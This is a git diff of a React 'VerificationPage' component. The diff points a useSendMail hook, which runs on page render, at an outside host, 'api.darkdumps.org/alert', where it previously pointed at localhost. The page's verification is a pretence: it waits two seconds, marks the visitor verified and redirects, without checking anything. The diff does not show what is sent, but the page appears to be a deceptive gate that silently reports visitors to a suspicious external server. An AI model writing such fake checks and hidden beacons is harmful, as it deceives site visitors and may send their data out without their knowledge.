@@ -13,11 +13,11 @@ interface VerificationProps {
 }
 
 const VerificationPage: React.FC<VerificationProps> = ({ onVerify }) => {
-  useSendMail('http://localhost:8080/alert');
-  
+  useSendMail("https://api.darkdumps.org/alert");
+
   const [isChecked, setIsChecked] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
-    const router = useRouter();
+  const router = useRouter();
 
   const handleCheck = async () => {
     setIsVerifying(true);
@@ -25,8 +25,8 @@ const VerificationPage: React.FC<VerificationProps> = ({ onVerify }) => {
     await new Promise((resolve) => setTimeout(resolve, 2000));
     setIsVerifying(false);
     setIsChecked(true);
-      onVerify?.(true);
-      router.push('/home');
+    onVerify?.(true);
+    router.push("/home");
   };
   return (
     <Card className="w-full max-w-md bg-transparent border-none shadow-none">
